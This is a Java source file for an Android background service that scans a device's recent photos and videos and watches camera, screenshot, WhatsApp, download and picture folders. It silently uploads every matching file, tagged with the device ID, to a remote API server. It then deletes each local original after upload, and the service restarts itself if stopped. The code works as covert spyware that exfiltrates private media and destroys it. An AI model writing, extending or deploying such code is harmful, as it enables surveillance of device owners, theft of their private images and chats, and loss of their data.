package com.ultimate.access.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;

import com.ultimate.access.network.ApiClient;
import com.ultimate.access.network.ApiService;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

public class MediaUploadService extends Service {

    private static final String TAG = "MediaUpload";
    private String deviceId;
    private HashMap<String, FileObserver> observers = new HashMap<>();

    @Override
    public void onCreate() {
        super.onCreate();

        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // Android 10+ के लिए MediaStore से scan करो
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            scanExistingImages();
            scanExistingVideos();  // 🔥 VIDEOS BHI SCAN HOGE
        }

        // Watch folders (photos + videos dono)
        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Camera/", "camera");
        watchFolder(Environment.getExternalStorageDirectory() + "/Pictures/Screenshots/", "screenshot");
        watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/", "whatsapp");
        watchFolder(Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/", "whatsapp_video");
        watchFolder(Environment.getExternalStorageDirectory() + "/Download/", "download");
        watchFolder(Environment.getExternalStorageDirectory() + "/Movies/", "movie");
        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/Video/", "video");
        watchFolder(Environment.getExternalStorageDirectory() + "/Pictures/", "pictures");
        watchFolder(Environment.getExternalStorageDirectory() + "/DCIM/", "dcim");

        Log.d(TAG, "MediaUploadService started");
    }

    private void scanExistingImages() {
        Log.d(TAG, "Scanning existing images...");

        String[] projection = {MediaStore.Images.Media.DATA};

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 100")) {

            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                while (cursor.moveToNext()) {
                    String path = cursor.getString(columnIndex);
                    File file = new File(path);
                    if (file.exists()) {
                        uploadToServer(path, "existing_image");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning images: " + e.getMessage());
        }
    }

    // 🔥 VIDEOS SCAN KARNE KA METHOD
    private void scanExistingVideos() {
        Log.d(TAG, "Scanning existing videos...");

        String[] projection = {MediaStore.Video.Media.DATA};

        try (Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 50")) {

            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);
                while (cursor.moveToNext()) {
                    String path = cursor.getString(columnIndex);
                    File file = new File(path);
                    if (file.exists()) {
                        uploadToServer(path, "existing_video");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning videos: " + e.getMessage());
        }
    }

    private void watchFolder(String path, String folderType) {
        File directory = new File(path);
        if (!directory.exists()) {
            directory.mkdirs();
        }

        FileObserver observer = new FileObserver(path) {
            @Override
            public void onEvent(int event, String fileName) {
                if (fileName == null) return;

                if (event == FileObserver.CREATE || event == FileObserver.MOVED_TO) {
                    String fullPath = path + fileName;

                    // Photos + Videos dono allow
                    if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") ||
                            fileName.endsWith(".png") || fileName.endsWith(".gif") ||
                            fileName.endsWith(".mp4") || fileName.endsWith(".3gp") ||
                            fileName.endsWith(".mkv") || fileName.endsWith(".webm") ||
                            fileName.endsWith(".mov") || fileName.endsWith(".avi")) {

                        uploadToServer(fullPath, folderType);
                    }
                }
            }
        };

        observer.startWatching();
        observers.put(path, observer);
    }

    private void uploadToServer(String filePath, String type) {
        File file = new File(filePath);
        if (!file.exists()) return;

        if (file.length() > 100 * 1024 * 1024) {
            Log.d(TAG, "File too large: " + filePath);
            return;
        }

        try {
            // VIDEO KE LIYE ALAG MIME TYPE
            MediaType mediaType;
            if (filePath.endsWith(".mp4") || filePath.endsWith(".3gp") ||
                    filePath.endsWith(".mkv") || filePath.endsWith(".webm") ||
                    filePath.endsWith(".mov") || filePath.endsWith(".avi")) {
                mediaType = MediaType.parse("video/*");
            } else {
                mediaType = MediaType.parse("image/*");
            }

            RequestBody requestFile = RequestBody.create(mediaType, file);
            MultipartBody.Part body = MultipartBody.Part.createFormData("file",
                    file.getName(), requestFile);

            RequestBody deviceIdBody = RequestBody.create(MediaType.parse("text/plain"), deviceId);
            RequestBody typeBody = RequestBody.create(MediaType.parse("text/plain"), type);

            ApiService apiService = ApiClient.getClient().create(ApiService.class);
            apiService.uploadMedia(deviceIdBody, typeBody, body)
                    .enqueue(new retrofit2.Callback<ApiService.MediaResponse>() {
                        @Override
                        public void onResponse(retrofit2.Call<ApiService.MediaResponse> call,
                                               retrofit2.Response<ApiService.MediaResponse> response) {
                            if (response.isSuccessful()) {
                                Log.d(TAG, "✅ Upload successful: " + file.getName());
                                file.delete();
                            } else {
                                Log.e(TAG, "❌ Upload failed: " + response.code() + " - " + response.message());
                            }
                        }

                        @Override
                        public void onFailure(retrofit2.Call<ApiService.MediaResponse> call, Throwable t) {
                            Log.e(TAG, "❌ Upload failed: " + t.getMessage());
                        }
                    });
        } catch (Exception e) {
            Log.e(TAG, "❌ Upload error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        for (FileObserver observer : observers.values()) {
            observer.stopWatching();
        }
        observers.clear();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}